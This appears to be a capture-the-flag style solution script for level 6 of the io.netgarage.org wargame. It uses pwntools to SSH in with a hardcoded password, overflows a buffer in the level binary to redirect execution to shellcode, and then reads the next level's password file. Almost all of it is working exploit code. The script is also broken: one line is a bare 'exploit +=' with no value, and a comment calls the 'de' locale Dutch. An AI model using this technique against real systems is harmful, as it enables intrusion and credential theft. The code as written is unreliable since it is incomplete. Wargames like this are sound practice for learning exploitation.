from pwn import *
s = ssh(user='level6', host='io.netgarage.org', password='fQ8W8YlSBJBWKV2R', port=22)
# game at http://io.netgarage.org/
# a simple buffer overflow with code redirection to shellcode
# strcat causes buffer greeting to overflow
# source /usr/local/peda/peda.py to get peda
# set environment variable to Dutch so the greeting
# is 11 characters long
exploit = b'export LANG=\'de\';'
exploit += b' /levels/level06 $(python -c \'print \"c\"*4+\"a\"*40\')'
exploit += b' $(python -c \'print \"a\"*25+\"\\x80\\xfb\\xff\\xbf\"'
exploit +=
sh = s.run(exploit)
for i in range(1):
    print(sh.recvline(timeout=2))
sh.sendline(b'cat /home/level7/.pass')
log.info('Password : '+sh.recvline(timeout=2).decode('utf-8')[7:])
s.close()
